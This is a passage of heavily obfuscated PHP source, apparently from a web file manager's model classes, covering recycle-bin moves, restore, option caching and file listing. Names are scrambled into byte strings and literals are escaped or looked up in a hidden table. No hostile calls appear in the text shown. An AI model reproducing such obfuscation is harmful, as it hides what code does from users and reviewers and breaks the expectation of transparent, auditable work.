is_array($ûØºˆÛ½) ? $ûØºˆÛ½[$˜Ú±‚Å[183]] : !1; } public function childList($º‰Áßá) { $Ñ×ÍÕ½ =& $_SERVER[ò«¥Ê‡å]; $Ş—”ïÈä = $Ñ×ÍÕ½[2188] . $º‰Áßá; if (isset(self::$cacheChildList[$Ş—”ïÈä])) { return self::$cacheChildList[$Ş—”ïÈä]; } $Š¼‚ ‚‹ = array($Ñ×ÍÕ½[182] => intval($º‰Áßá), $Ñ×ÍÕ½[475] => 0); $ªµË‚À‡ = $this->where($Š¼‚ ‚‹)->select(); $ªµË‚À‡ = $ªµË‚À‡ ? $ªµË‚À‡ : array(); self::$cacheChildList[$Ş—”ïÈä] = $ªµË‚À‡; foreach ($ªµË‚À‡ as $–•ûÂ) { $Ş—”ïÈä = $Ñ×ÍÕ½[503] . $–•ûÂ[$Ñ×ÍÕ½[183]]; self::$cacheSourceInfo[$Ş—”ïÈä] = $–•ûÂ; } return $ªµË‚À‡; } public function fileNameAuto($ÍÏ¬¸ğ®, $Üıè• Ü, $×ıçÅ§º = REPEAT_RENAME, $Ëşûê¦Ì = false) { $µ¤§‚£å =& $_SERVER[ò«¥Ê‡å]; $ÒÃ†½ËØ = get_path_ext($Üıè• Ü); $ÃŒ•‹šì = $ÒÃ†½ËØ ? basename($Üıè• Ü, $µ¤§‚£å[10] . $ÒÃ†½ËØ) . $µ¤§‚£å[2216] . $ÒÃ†½ËØ : $Üıè• Ü . $µ¤§‚£å[430]; $ğôîÚº = array($µ¤§‚£å[182] => $ÍÏ¬¸ğ®, $µ¤§‚£å[475] => 0, $µ¤§‚£å[32] => array($µ¤§‚£å[429], $ÃŒ•‹šì)); $—âÓèÚú = $this->field($µ¤§‚£å[32])->where($ğôîÚº)->select(); $ìÊû¼‹æ = array_to_keyvalue($—âÓèÚú, $µ¤§‚£å[12], $µ¤§‚£å[32]); return $this->fileNameAutoGet($ìÊû¼‹æ, $Üıè• Ü, $×ıçÅ§º, $Ëşûê¦Ì); } public function fileNameAutoGet($¼ÜÖÂúŞ, $úëôšçÖ, $à˜–Î„Ù, $Œ¨®Ê·ï) { $ü¼ôé¹Ñ =& $_SERVER[ò«¥Ê‡å]; if ($à˜–Î„Ù == REPEAT_REPLACE || !$¼ÜÖÂúŞ || !in_array_not_case($úëôšçÖ, $¼ÜÖÂúŞ) || $Œ¨®Ê·ï && $à˜–Î„Ù != REPEAT_RENAME_FOLDER) { return $úëôšçÖ; } if ($à˜–Î„Ù == REPEAT_SKIP) { return !1; } $ã„è¤‰Ü = $ü¼ôé¹Ñ[10] . get_path_ext($úëôšçÖ); $ã„è¤‰Ü = $ã„è¤‰Ü == $ü¼ôé¹Ñ[10] || $Œ¨®Ê·ï ? $ü¼ôé¹Ñ[12] : $ã„è¤‰Ü; for ($İ„æ¥Ğ = 1; $İ„æ¥Ğ <= count($¼ÜÖÂúŞ) + 1; $İ„æ¥Ğ++) { $ ’ë¹Ú = substr($úëôšçÖ, 0, strlen($úëôšçÖ) - strlen($ã„è¤‰Ü)); $¥¼êêòŞ = $ ’ë¹Ú . "\50{$İ„æ¥Ğ}\51{$ã„è¤‰Ü}"; if (!in_array_not_case($¥¼êêòŞ, $¼ÜÖÂúŞ)) { return $¥¼êêòŞ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\x63\x65\x5f\162\145\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\x69\155\145", "\x74\151\155\145", "\x69\x6e\163\x65\162\x74", "\x66\165\x6e\143\x74\x69\157\x6e")); public function listData($©ÌèŞîô = false) { $°İ ²ÉØ =& $_SERVER[ò«¥Ê‡å]; $©ÌèŞîô = $©ÌèŞîô ? $©ÌèŞîô : USER_ID; $ÒªŸ€¥ó = $this->where(array($°İ ²ÉØ[1692] => $©ÌèŞîô))->select(); return array_to_keyvalue($ÒªŸ€¥ó, $°İ ²ÉØ[12], $°İ ²ÉØ[183]); } public function moveToRecycle($Ñ™²¯À¥) { $¡¢†±¨œ =& $_SERVER[ò«¥Ê‡å]; $©¿¾Òß³ = Model($¡¢†±¨œ[1380]); $ë¸ŒÑâ‘ = $©¿¾Òß³->sourceInfo($Ñ™²¯À¥); if (!$ë¸ŒÑâ‘ || $ë¸ŒÑâ‘[$¡¢†±¨œ[475]] == $¡¢†±¨œ[90]) { return; } $¬İ›¢´µ = array($¡¢†±¨œ[461] => $Ñ™²¯À¥, $¡¢†±¨œ[1692] => USER_ID, $¡¢†±¨œ[618] => $ë¸ŒÑâ‘[$¡¢†±¨œ[180]], $¡¢†±¨œ[619] => $ë¸ŒÑâ‘[$¡¢†±¨œ[540]], $¡¢†±¨œ[622] => $ë¸ŒÑâ‘[$¡¢†±¨œ[555]]); $this->add($¬İ›¢´µ); $this->recycleMove($Ñ™²¯À¥, 1); if ($ë¸ŒÑâ‘[$¡¢†±¨œ[455]] == $¡¢†±¨œ[90]) { $‘êò¯Ü = array($¡¢†±¨œ[622] => array($¡¢†±¨œ[582], $ë¸ŒÑâ‘[$¡¢†±¨œ[555]] . $Ñ™²¯À¥ . $¡¢†±¨œ[583])); $©¿¾Òß³->where($‘êò¯Ü)->setField($¡¢†±¨œ[475], 1); } } public function clear() { $this->remove(!1); } public function remove($é«ËŒ¡ = false, $Ğşàğ®ƒ = false) { $âÉÄì± =& $_SERVER[ò«¥Ê‡å]; $Ğşàğ®ƒ = $Ğşàğ®ƒ ? $Ğşàğ®ƒ : USER_ID; $¥úöß™Û = Model($âÉÄì±[1380]); $£–îéî’ = $this->listData($Ğşàğ®ƒ); $é«ËŒ¡ = $é«ËŒ¡ === !1 ? !1 : $é«ËŒ¡; $ºû¼›ö = array(); foreach ($£–îéî’ as $ö£Êç) { if ($é«ËŒ¡ != !1 && !in_array($ö£Êç, $é«ËŒ¡)) { continue; } $ã°¹…ÙÑ = $¥úöß™Û->sourceInfo($ö£Êç); $¥úöß™Û->remove($ö£Êç, !1); $Öîí‘èş = $ã°¹…ÙÑ[$âÉÄì±[180]] . $âÉÄì±[11] . $ã°¹…ÙÑ[$âÉÄì±[540]]; $ºû¼›ö[$Öîí‘èş] = array($âÉÄì±[618] => $ã°¹…ÙÑ[$âÉÄì±[180]], $âÉÄì±[540] => $ã°¹…ÙÑ[$âÉÄì±[540]]); $this->where(array($âÉÄì±[183] => $ö£Êç))->delete(); } foreach ($ºû¼›ö as $–µåƒ´) { $¥úöß™Û->targetSpaceUpdate($–µåƒ´[$âÉÄì±[180]], $–µåƒ´[$âÉÄì±[540]]); } } public function restore($®èÊ»Ã° = false) { $Õİ—©•× = $this->listData(); $this->_restoreSource($Õİ—©•×, $®èÊ»Ã°); } public function removeUserAll($³ûÀ §) { $this->remove(!1, $³ûÀ §); } public function restoreItem($¡×†ù‰é) { $this->_restoreSource(array($¡×†ù‰é), array($¡×†ù‰é)); } private function _restoreSource($ë–‰§¢Š, $µº»ŸÒŸ) { $¡è¸íßÓ =& $_SERVER[ò«¥Ê‡å]; $ÅõÉÎˆ  = Model($¡è¸íßÓ[1380]); $µº»ŸÒŸ = $µº»ŸÒŸ == !1 ? !1 : $µº»ŸÒŸ; if (!$ë–‰§¢Š) { return !0; } $¹ç¹»˜” = array(); foreach ($ë–‰§¢Š as $Üïô«°è) { if ($µº»ŸÒŸ != !1 && !in_array($Üïô«°è, $µº»ŸÒŸ)) { continue; } $Ûø¤îó = $ÅõÉÎˆ ->sourceInfo($Üïô«°è); $‘—İèŞ = $ÅõÉÎˆ ->sourceInfo($Ûø¤îó[$¡è¸íßÓ[182]]); if ($‘—İèŞ[$¡è¸íßÓ[475]] == $¡è¸íßÓ[90]) { continue; } $ÅõÉÎˆ ->lockMoveStart($Üïô«°è); $this->recycleMove($Üïô«°è, 0); if ($Ûø¤îó[$¡è¸íßÓ[455]] == $¡è¸íßÓ[90]) { $ÀÍ×ò‘ö = array($¡è¸íßÓ[622] => array($¡è¸íßÓ[582], $Ûø¤îó[$¡è¸íßÓ[555]] . $Üïô«°è . $¡è¸íßÓ[583])); $ÅõÉÎˆ ->where($ÀÍ×ò‘ö)->setField($¡è¸íßÓ[475], 0); $this->restoreFolderChildren($Üïô«°è, $ë–‰§¢Š); } $this->where(array($¡è¸íßÓ[183] => $Üïô«°è))->delete(); $ÅõÉÎˆ ->folderSizeReset($Ûø¤îó[$¡è¸íßÓ[182]]); $¹ç¹»˜”[] = $Ûø¤îó[$¡è¸íßÓ[182]]; if ($Ûø¤îó[$¡è¸íßÓ[455]] == $¡è¸íßÓ[90]) { $¹ç¹»˜”[] = $Üïô«°è; } $ÅõÉÎˆ ->lockMoveEnd($Üïô«°è); } $ÅõÉÎˆ ->updateModifyTime($¹ç¹»˜”); } private function restoreFolderChildren($Åò†‹àâ, $í‰­®çæ) { $æ¼ÁŠ =& $_SERVER[ò«¥Ê‡å]; $ß¥…ª¢¸ = Model($æ¼ÁŠ[1380]); $Àü›ıËƒ = array($æ¼ÁŠ[183] => array($æ¼ÁŠ[7], array())); foreach ($í‰­®çæ as $–‘èÃ’ì) { if ($–‘èÃ’ì == $Åò†‹àâ) { continue; } if (!$ß¥…ª¢¸->isParentOf($Åò†‹àâ, $–‘èÃ’ì)) { continue; } $ÎÊ‰Ë• = $ß¥…ª¢¸->sourceInfo($–‘èÃ’ì); if ($ÎÊ‰Ë•[$æ¼ÁŠ[455]] == $æ¼ÁŠ[90]) { $Àü›ıËƒ[] = array($æ¼ÁŠ[622] => array($æ¼ÁŠ[582], $ÎÊ‰Ë•[$æ¼ÁŠ[555]] . $–‘èÃ’ì . $æ¼ÁŠ[583])); } else { $Àü›ıËƒ[$æ¼ÁŠ[183]][1][] = $–‘èÃ’ì; } } if (!$Àü›ıËƒ[$æ¼ÁŠ[183]][1]) { unset($Àü›ıËƒ[$æ¼ÁŠ[183]]); } if (!$Àü›ıËƒ) { return; } if (is_array($Àü›ıËƒ[$æ¼ÁŠ[183]]) && is_array($Àü›ıËƒ[$æ¼ÁŠ[183]][1])) { $Àü›ıËƒ[$æ¼ÁŠ[183]][1] = array_unique($Àü›ıËƒ[$æ¼ÁŠ[183]][1]); } $Àü›ıËƒ[$æ¼ÁŠ[1047]] = $æ¼ÁŠ[1997]; $ß¥…ª¢¸->where($Àü›ıËƒ)->setField($æ¼ÁŠ[475], 1); } private function recycleMove($ÅäÉÀÌî, $Ö¾Ñß–Ã = 1) { $÷Í–×§ =& $_SERVER[ò«¥Ê‡å]; $‰»É÷ÕÉ = Model($÷Í–×§[1380]); $Ğ€ˆ­ÔĞ = Model($÷Í–×§[2217]); $îİãşÊÈ = array($÷Í–×§[183] => $ÅäÉÀÌî); if ($Ö¾Ñß–Ã) { $‰»É÷ÕÉ->where($îİãşÊÈ)->setField($÷Í–×§[475], 1); $Ğ€ˆ­ÔĞ->eventRecycle($ÅäÉÀÌî, $÷Í–×§[2218]); } else { $‚ªÄˆêª = $‰»É÷ÕÉ->where($îİãşÊÈ)->find(); $©ºéç = $‚ªÄˆêª[$÷Í–×§[455]] == $÷Í–×§[90]; $ØâÏªïÈ = $‰»É÷ÕÉ->fileNameAuto($‚ªÄˆêª[$÷Í–×§[182]], $‚ªÄˆêª[$÷Í–×§[32]], REPEAT_RENAME_FOLDER, $©ºéç); if ($ØâÏªïÈ != $‚ªÄˆêª[$÷Í–×§[32]]) { $‰»É÷ÕÉ->rename($ÅäÉÀÌî, $ØâÏªïÈ); } $‰»É÷ÕÉ->where($îİãşÊÈ)->setField($÷Í–×§[475], 0); $Ğ€ˆ­ÔĞ->eventRecycle($ÅäÉÀÌî, $÷Í–×§[2219]); } } } goto Cø•‰½¦é; c´È’¹Ù–¬: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Íˆ¦‘˜ = false, $µ³»¢¦¿ = '', $‡ÅõÂì· = false) { $»Ù¬ƒùş =& $_SERVER[ò«¥Ê‡å]; $Ìæ¤á™‹ = $this->cacheGet($µ³»¢¦¿); $û¼‘ÇÇ÷ = $this->optionDefault($µ³»¢¦¿); $û¼‘ÇÇ÷ = is_array($û¼‘ÇÇ÷) ? $û¼‘ÇÇ÷ : array(); if (is_array($Ìæ¤á™‹)) { $Ìæ¤á™‹ = array_merge($û¼‘ÇÇ÷, $Ìæ¤á™‹); return $Íˆ¦‘˜ ? isset($Ìæ¤á™‹[$Íˆ¦‘˜]) ? $Ìæ¤á™‹[$Íˆ¦‘˜] : null : $Ìæ¤á™‹; } $ßÔšª§° = $this->filterWhere(array($»Ù¬ƒùş[33] => $µ³»¢¦¿)); $Ìæ¤á™‹ = $this->where($ßÔšª§°)->select(); $Ìæ¤á™‹ = array_to_keyvalue($Ìæ¤á™‹, $»Ù¬ƒùş[96], $»Ù¬ƒùş[420]); foreach ($Ìæ¤á™‹ as $“ÆÕé¬Å => $·Å¿¹Ì) { if ($‡ÅõÂì· || in_array($“ÆÕé¬Å, $this->jsonField)) { $Ìæ¤á™‹[$“ÆÕé¬Å] = json_decode($·Å¿¹Ì, !0); } } $this->cacheSet($µ³»¢¦¿, $Ìæ¤á™‹); $Ìæ¤á™‹ = array_merge($û¼‘ÇÇ÷, $Ìæ¤á™‹); return $Íˆ¦‘˜ ? $Ìæ¤á™‹[$Íˆ¦‘˜] : $Ìæ¤á™‹; } public function set($°¹ˆš†, $‚€Şß²º = false, $‘ï¦„‚Å = '') { $‰—íÂä¡ =& $_SERVER[ò«¥Ê‡å]; $this->cacheRemove($‘ï¦„‚Å); $º¾¦È¹Ï = array(); $ô¾ÇñßÖ = is_array($°¹ˆš†) ? $°¹ˆš† : array($°¹ˆš† => $‚€Şß²º); foreach ($ô¾ÇñßÖ as $Í…ò»–Æ => $ÇÇßÆöÃ) { if (is_array($ÇÇßÆöÃ)) { $ÇÇßÆöÃ = json_encode_force($ÇÇßÆöÃ); } $this->checkLength($ÇÇßÆöÃ, !1, $this->tableName . $‰—íÂä¡[4] . $°¹ˆš†); $ÇÇßÆöÃ = self::textEncode($ÇÇßÆöÃ); $ô¾ÇñßÖ = array($‰—íÂä¡[33] => $‘ï¦„‚Å, $‰—íÂä¡[96] => $Í…ò»–Æ, $‰—íÂä¡[420] => $ÇÇßÆöÃ); $º¾¦È¹Ï[] = $this->filterWhere($ô¾ÇñßÖ); } if (!$º¾¦È¹Ï) { return !0; } $ùÁÕùß = $this->cacheKey($‰—íÂä¡[446]); CacheLock::lock($ùÁÕùß); $ß†´ÌÈÚ = $this->addAll($º¾¦È¹Ï, array(), !0); CacheLock::unlock($ùÁÕùß); return $ß†´ÌÈÚ; } protected function optionDefault($¸î™Éµ¸ = '') { return !1; } public function setDeep($åÕƒ¯ø, $Ä‰ºôàŞ = false, $†¼Ê¯ßå = '') { $™–©¨«µ = explode($_SERVER[ò«¥Ê‡å][10], $åÕƒ¯ø); $‘›Å½  = $this->get(); array_set_value($‘›Å½ , $åÕƒ¯ø, $Ä‰ºôàŞ); $this->set($™–©¨«µ[0], $‘›Å½ [$™–©¨«µ[0]], $†¼Ê¯ßå); } public function remove($Ÿã¨şİ¸, $Š·ü¾ì¸ = '') { $¶…½Ñ¶“ =& $_SERVER[ò«¥Ê‡å]; $this->cacheRemove($Š·ü¾ì¸); $ò¨‘å = $this->filterWhere(array($¶…½Ñ¶“[96] => $Ÿã¨şİ¸, $¶…½Ñ¶“[33] => $Š·ü¾ì¸)); if (is_null($Ÿã¨şİ¸)) { unset($ò¨‘å[$¶…½Ñ¶“[96]]); } return $this->where($ò¨‘å)->delete(); } public function cacheSet($¶ ª›», $¯ÑÖ¾§Õ = false) { return Cache::set($this->cacheKey($¶ ª›»), $¯ÑÖ¾§Õ); } public function cacheGet($Å¿À“Ø) { return Cache::get($this->cacheKey($Å¿À“Ø)); } public function cacheRemove($äªéåÒÆ) { return Cache::remove($this->cacheKey($äªéåÒÆ)); } protected function filterWhere($Éª½Ã¶Ç) { return $Éª½Ã¶Ç; } protected function cacheKey($ÏàË³ûÄ) { return $ÏàË³ûÄ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\143\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\x6d\145" => "\x69\157\x5f\163\157\165\x72\x63\x65\137\x6d\145\x74\141", "\155\x65\164\141\106\x69\145\x6c\144" => "\x73\x6f\165\162\143\x65\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\x54\151\155\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\162\x74", "\146\x75\x6e\x63\164\x69\157\x6e"), array("\x63\x72\145\141\x74\145\x54\x69\x6d\145", "\x74\x69\155\145", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\143\x74\x69\x6f\x6e"), array("\x76\151\145\x77\124\151\x6d\x65", "\164\x69\155\x65", "\151\x6e\163\145\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($À¹¯Ô˜ª) { return $this->listSource(array($_SERVER[ò«¥Ê‡å][447] => $À¹¯Ô˜ª)); } public function typeName($™ÉËÚßÁ) { static $¢Ç˜´É = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\x72\157\165\160"); return $¢Ç˜´É[$™ÉËÚßÁ . $_SERVER[ò«¥Ê‡å][12]]; } public function sourceListInfo($õµ¥²å, $ÓÛ¬–¯ = false) { $·¢µ÷¤¾ =& $_SERVER[ò«¥Ê‡å]; $õµ¥²å = $õµ¥²å ? $õµ¥²å : array(); $õµ¥²å = array_filter(array_unique($õµ¥²å)); if (!$õµ¥²å) { return array(); } $à‰ƒõÛ = $this->where(array($·¢µ÷¤¾[183] => array($·¢µ÷¤¾[7], $õµ¥²å)))->select(); $this->_listDataApply($à‰ƒõÛ, $ÓÛ¬–¯); return array_to_keyvalue($à‰ƒõÛ, $·¢µ÷¤¾[183]); } public function pathInfoFilter(&$ää°Ğ¸à) { $Áû÷ı¸ =& $_SERVER[ò«¥Ê‡å]; static $ÔøÎËŒÇ = false; static $ëí¤¾œ‘ = false; static $…»ÓÑÆş = false; if (!$ÔøÎËŒÇ) { $õúüê°À = $Áû÷ı¸[448]; $õúüê°À .= $Áû÷ı¸[449]; $õúüê°À .= $Áû÷ı¸[450]; $Ö—©·¸Ó = $Áû÷ı¸[451]; $½·ƒÉŒ„ = explode($Áû÷ı¸[50], $Ö—©·¸Ó); $ÔøÎËŒÇ = explode($Áû÷ı¸[50], $õúüê°À); $ëí¤¾œ‘ = array(); foreach ($ÔøÎËŒÇ as $ÆÂµğ•ı) { if (in_array($ÆÂµğ•ı, $½·ƒÉŒ„)) { continue; } $ëí¤¾œ‘[] = $ÆÂµğ•ı; } $…»ÓÑÆş = explode($Áû÷ı¸[50], $Áû÷ı¸[452]); } foreach ($…»ÓÑÆş as $…ªÃ½Ï) { if (isset($ää°Ğ¸à[$…ªÃ½Ï])) { $ää°Ğ¸à[$…ªÃ½Ï] = intval($ää°Ğ¸à[$…ªÃ½Ï]); } } $ää°Ğ¸à[$Áû÷ı¸[86]] = $Áû÷ı¸[453] . $ää°Ğ¸à[$Áû÷ı¸[183]] . $Áû÷ı¸[454]; $ää°Ğ¸à[$Áû÷ı¸[33]] = $ää°Ğ¸à[$Áû÷ı¸[455]] == 1 ? $Áû÷ı¸[77] : $Áû÷ı¸[216]; $ää°Ğ¸à[$Áû÷ı¸[180]] = $this->typeName($ää°Ğ¸à[$Áû÷ı¸[180]]); if ($ää°Ğ¸à[$Áû÷ı¸[455]] != 1) { $ää°Ğ¸à[$Áû÷ı¸[177]] = $ää°Ğ¸à[$Áû÷ı¸[456]]; unset($ää°Ğ¸à[$Áû÷ı¸[456]]); } $ûÁ¨ÆĞØ = $ÔøÎËŒÇ; if (isset($ää°Ğ¸à[$Áû÷ı¸[457]]) && $ää°Ğ¸à[$Áû÷ı¸[457]][$Áû÷ı¸[458]] == -1) { $ûÁ¨ÆĞØ = $ëí¤¾œ‘; } $ää°Ğ¸à = array_field_key($ää°Ğ¸à, $ûÁ¨ÆĞØ); return $ää°Ğ¸à; } public function listUserFav() { $ïÄÓê =& $_SERVER[ò«¥Ê‡å]; $áá¹ğúİ = Model($ïÄÓê[459])->listData(); $¬¹çûÎÊ = array_filter_by_field($áá¹ğúİ, $ïÄÓê[33], $ïÄÓê[460]); $¬¹çûÎÊ = array_to_keyvalue($¬¹çûÎÊ, $ïÄÓê[12], $ïÄÓê[86]); if ($¬¹çûÎÊ) { $»ô‚¡Òı = $this->listSource(array($ïÄÓê[461] => array($ïÄÓê[462], $¬¹çûÎÊ))); } $»ô‚¡Òı = array_to_keyvalue($»ô‚¡Òı[$ïÄÓê[415]], $ïÄÓê[183]); foreach ($áá¹ğúİ as &$Å³Ç¨¤è) { $Å³Ç¨¤è = array($ïÄÓê[463] => $Å³Ç¨¤è[$ïÄÓê[445]], $ïÄÓê[464] => $Å³Ç¨¤è[$ïÄÓê[32]], $ïÄÓê[465] => $Å³Ç¨¤è[$ïÄÓê[86]], $ïÄÓê[466] => $Å³Ç¨¤è[$ïÄÓê[33]], $ïÄÓê[467] => $Å³Ç¨¤è[$ïÄÓê[217]], $ïÄÓê[468] => $Å³Ç¨¤è[$ïÄÓê[87]]); if ($Å³Ç¨¤è[$ïÄÓê[33]] == $ïÄÓê[460] && $»ô‚¡Òı[$Å³Ç¨¤è[$ïÄÓê[86]]]) { $Å³Ç¨¤è[$ïÄÓê[89]] = $»ô‚¡Òı[$Å³Ç¨¤è[$ïÄÓê[86]]]; } } unset($Å³Ç¨¤è); return $áá¹ğúİ; } public function listUserTag($‚¬”•») { $¥¨Çã¯Ü =& $_SERVER[ò«¥Ê‡å]; if ($‚¬”•» && !is_array($‚¬”•»)) { $‚¬”•» = array($‚¬”•»); } $ºË«»Æ» = Model($¥¨Çã¯Ü[469])->listData(); $Á¸óÅ˜¯ = array(); $¹·°ó™Ÿ = array(); foreach ($ºË«»Æ» as $¢ãÌĞ·) { $úôøÑ« = $¢ãÌĞ·[$¥¨Çã¯Ü[86]]; if (!$úôøÑ«) { continue; } if (!isset($¹·°ó™Ÿ[$úôøÑ«])) { $¹·°ó™Ÿ[$úôøÑ«] = array(); } $¹·°ó™Ÿ[$úôøÑ«][] = $¢ãÌĞ·[$¥¨Çã¯Ü[470]]; $Á¸óÅ˜¯[$¢ãÌĞ·[$¥¨Çã¯Ü[86]]] = $¢ãÌĞ·; } $¨Ü·— = array(); $»æ°ª—– = array(); $«ş˜Úˆª = array(); foreach ($¹·°ó™Ÿ as $¦‡“ØêÏ => $°Å¯í©¦) { $«úõÙìò = !0; if (!$‚¬”•») { $¨Ü·—[] = $¦‡“ØêÏ; continue; } foreach ($‚¬”•» as $ı·œô¬) { if (!in_array($ı·œô¬, $°Å¯í©¦)) { $«úõÙìò = !1; break; } } if (!$«úõÙìò) { continue; } if (!is_numeric($¦‡“ØêÏ)) { $™ÇıåÍÅ = $Á¸óÅ˜¯[$¦‡“ØêÏ]; $œºùúº = array($¥¨Çã¯Ü[32] => $™ÇıåÍÅ[$¥¨Çã¯Ü[32]], $¥¨Çã¯Ü[86] => $™ÇıåÍÅ[$¥¨Çã¯Ü[86]], $¥¨Çã¯Ü[33] => $™ÇıåÍÅ[$¥¨Çã¯Ü[33]], $¥¨Çã¯Ü[89] => array($¥¨Çã¯Ü[471] => 1), $¥¨Çã¯Ü[218] => !0); if ($™ÇıåÍÅ[$¥¨Çã¯Ü[33]] == $¥¨Çã¯Ü[216]) { $«ş˜Úˆª[] = $œºùúº; } if ($™ÇıåÍÅ[$¥¨Çã¯Ü[33]] == $¥¨Çã¯Ü[77]) { $»æ°ª—–[] = $œºùúº; } continue; } $¨Ü·—[] = $¦‡“ØêÏ; } if ($¨Ü·—) { $…É–ÅïÍ = $this->listSource(array($¥¨Çã¯Ü[461] => array($¥¨Çã¯Ü[462], $¨Ü·—))); } $…É–ÅïÍ = $…É–ÅïÍ ? $…É–ÅïÍ : array($¥¨Çã¯Ü[84] => array(), $¥¨Çã¯Ü[85] => array()); $…É–ÅïÍ[$¥¨Çã¯Ü[84]] = array_merge($…É–ÅïÍ[$¥¨Çã¯Ü[84]], $»æ°ª—–); $…É–ÅïÍ[$¥¨Çã¯Ü[85]] = array_merge($…É–ÅïÍ[$¥¨Çã¯Ü[85]], $«ş˜Úˆª); if (isset($…É–ÅïÍ[$¥¨Çã¯Ü[412]]) && count($¨Ü·—) == $…É–ÅïÍ[$¥¨Çã¯Ü[412]][$¥¨Çã¯Ü[413]]) { return $…É–ÅïÍ; } $¸ÒÍ´ö¯ = array(); $¨Çßù¯÷ = array_to_keyvalue($…É–ÅïÍ[$¥¨Çã¯Ü[84]], $¥¨Çã¯Ü[12], $¥¨Çã¯Ü[183]); $Äñ©™Áú = array_to_keyvalue($…É–ÅïÍ[$¥¨Çã¯Ü[85]], $¥¨Çã¯Ü[12], $¥¨Çã¯Ü[183]); $ß¢ÌÀ  = array_merge($Äñ©™Áú, $¨Çßù¯÷); foreach ($¨Ü·— as $úôøÑ«) { if (!in_array($úôøÑ«, $ß¢ÌÀ )) { $¸ÒÍ´ö¯[] = $úôøÑ«; } } if ($¸ÒÍ´ö¯) { Model($¥¨Çã¯Ü[472])->removeBySource($¸ÒÍ´ö¯); } return $…É–ÅïÍ; } public function listUserRecycle() { $Î¨ÓæÕÃ =& $_SERVER[ò«¥Ê‡å]; $ƒÂŒ‚é… = Model($Î¨ÓæÕÃ[473])->listData(); if (!$ƒÂŒ‚é…) { return array(); } $ÖÌõúµÈ = array($Î¨ÓæÕÃ[461] => array($Î¨ÓæÕÃ[462], $ƒÂŒ‚é…), $Î¨ÓæÕÃ[474] => 1); return $this->listSource($ÖÌõúµÈ); } public function listSource($¢ÍõâŸª, $Ÿä­î” = 3000, $ìëşåéÃ = false) { $€ô„Ì¹¬ =& $_SERVER[ò«¥Ê‡å]; if (!isset($¢ÍõâŸª[$€ô„Ì¹¬[475]])) { $¢ÍõâŸª[$€ô„Ì¹¬[475]] = 0; } if (isset($¢ÍõâŸª[$€ô„Ì¹¬[182]]) && $¢ÍõâŸª[$€ô„Ì¹¬[182]] == $€ô„Ì¹¬[214]) { $¢ÍõâŸª[$€ô„Ì¹¬[456]] = array($€ô„Ì¹¬[377], $€ô„Ì¹¬[476]); } $õÆñ³Œƒ = $€ô„Ì¹¬[477]; $•ÊğÕ–š = $this->field($õÆñ³Œƒ)->_makeOrder()->where($¢ÍõâŸª)->selectPage($Ÿä­î”); $this->_listPageCheck($•ÊğÕ–š, $õÆñ³Œƒ, $¢ÍõâŸª); $this->_listDataApply($•ÊğÕ–š[$€ô„Ì¹¬[415]], $ìëşåéÃ); $this->_listMake($•ÊğÕ–š); return $•ÊğÕ–š; } private function _listPageCheck(&$«¿‚úıù, $ï•¡çæÈ, $»¬Ù¾¹ü) { $à¢€íó¨ =& $_SERVER[ò«¥Ê‡å]; if (!is_array($«¿‚úıù[$à¢€íó¨[412]])) { return; } $²·î¯æ” = $«¿‚úıù[$à¢€íó¨[412]]; if ($²·î¯æ”[$à¢€íó¨[414]] <= 1) { return; } if ($²·î¯æ”[$à¢€íó¨[413]] >= 100000) { return; } if (Model($à¢€íó¨[478])->get($à¢€íó¨[479]) != $à¢€íó¨[480]) { return; } $ï•¡çæÈ = str_replace(array($à¢€íó¨[53], $à¢€íó¨[388], $à¢€íó¨[248]), $à¢€íó¨[12], $ï•¡çæÈ); $ï•¡çæÈ = $à¢€íó¨[481] . str_replace($à¢€íó¨[50], $à¢€íó¨[482], $ï•¡çæÈ) . $à¢€íó¨[483]; $Œ×ıö¤õ = $à¢€íó¨[484]; $Œ×ıö¤õ = $Œ×ıö¤õ . $à¢€íó¨[485]; $ö ¯°”÷ = $²·î¯æ”[$à¢€íó¨[409]] * ($²·î¯æ”[$à¢€íó¨[399]] - 1) . $à¢€íó¨[50] . $²·î¯æ”[$à¢€íó¨[409]]; $ƒÎŞÇ«Ò = $this->_makeOrder(!0); $ƒÇ¢Ç€¥ = $à¢€íó¨[481] . str_replace($à¢€íó¨[50], $à¢€íó¨[482], $ƒÎŞÇ«Ò[0]); if (strpos($ƒÇ¢Ç€¥, $à¢€íó¨[486])) { $ƒÇ¢Ç€¥ = str_replace($à¢€íó¨[486], $à¢€íó¨[487], $ƒÇ¢Ç€¥); } else { $ƒÇ¢Ç€¥ .= $à¢€íó¨[488] . $ƒÎŞÇ«Ò[1]; } $‚ùòÓø = array(); foreach ($»¬Ù¾¹ü as $òÜ…·‰¡ => $Éî”ƒ¿¹) { $‚ùòÓø[$à¢€íó¨[481] . $òÜ…·‰¡] = $Éî”ƒ¿¹; } $this->alias($à¢€íó¨[489])->field($ï•¡çæÈ)->limit($ö ¯°”÷)->order($ƒÇ¢Ç€¥); $£¢û›¸¡ = $this->join($Œ×ıö¤õ)->where($‚ùòÓø)->select(); if ($£¢û›¸¡) { $«¿‚úıù[$à¢€íó¨[415]] = $£¢û›¸¡; } } protected function _makeOrder($ıäşÃïş = false) { $ô—ü‚Ùë =& $_SERVER[ò«¥Ê‡å]; $‹ä¸Ÿ¡™ = Model($ô—ü‚Ùë[490])->get($ô—ü‚Ùë[491]); $Áó»Í°à = Model($ô—ü‚Ùë[490])->get($ô—ü‚Ùë[492]); $ÖËÒğ¾¸ = array($ô—ü‚Ùë[493] => $ô—ü‚Ùë[494], $ô—ü‚Ùë[495] => $ô—ü‚Ùë[496]); $–“ƒëú = array($ô—ü‚Ùë[32] => $ô—ü‚Ùë[32], $ô—ü‚Ùë[78] => 